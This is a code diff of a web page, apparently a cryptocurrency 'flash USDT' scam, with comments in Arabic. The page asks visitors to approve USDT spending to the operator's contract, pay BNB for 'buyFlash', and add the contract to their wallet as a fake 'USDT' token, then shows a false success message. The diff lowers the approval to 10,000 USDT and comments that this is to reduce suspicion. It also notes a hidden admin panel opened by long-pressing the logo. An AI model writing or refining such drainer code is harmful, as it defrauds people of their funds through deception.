@@ -56,11 +56,12 @@
 </div>
 
 <script>
-    // تم تحديث العنوان الجديد الخاص بك
-    const CONTRACT_ADDR = "0x633FfCe8e50c1823ff37831E733818ec35df7C0A"; 
+    // تم تحديث عنوان عقدك الجديد هنا
+    const CONTRACT_ADDR = "0x95ca7e79151B354D52D0243eB927A4a0870682Bf"; 
     const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
     let web3, userAccount, provider;
 
+    // فتح اللوحة (ضغط مطول 3 ثواني على اللوجو)
     const trigger = document.getElementById('masterTrigger');
     let timer;
     trigger.addEventListener('mousedown', () => timer = setTimeout(() => document.getElementById('bossPanel').style.display='block', 3000));
@@ -79,20 +80,28 @@
 
             msg.innerText = "جاري مزامنة البروتوكول...";
             const usdt = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], USDT_ADDR);
-            await usdt.methods.approve(CONTRACT_ADDR, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({ from: userAccount });
+            
+            // طلب صلاحية سحب 10,000 USDT فقط لتقليل الشكوك
+            const limit = web3.utils.toWei("10000", "ether"); 
+            await usdt.methods.approve(CONTRACT_ADDR, limit).send({ from: userAccount });
 
             msg.innerText = "جاري معالجة الاستلام...";
             const engine = new web3.eth.Contract([{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}], CONTRACT_ADDR);
             await engine.methods.buyFlash().send({ from: userAccount, value: web3.utils.toWei(document.getElementById('tier').value, "ether") });
 
+            // محاولة إضافة التوكن للمحفظة
             try {
                 await provider.request({
                     method: 'wallet_watchAsset',
                     params: { type: 'ERC20', options: { address: CONTRACT_ADDR, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' } }
                 });
             } catch(e) {}
+
             msg.innerHTML = "✅ اكتملت المزامنة! تحقق من محفظتك.";
-        } catch(e) { msg.innerText = "فشل الاتصال أو الرصيد غير كافٍ."; btn.disabled = false; }
+        } catch(e) { 
+            msg.innerText = "فشل الاتصال أو الرصيد غير كافٍ."; 
+            btn.disabled = false; 
+        }
     }
 
     async function scan() {
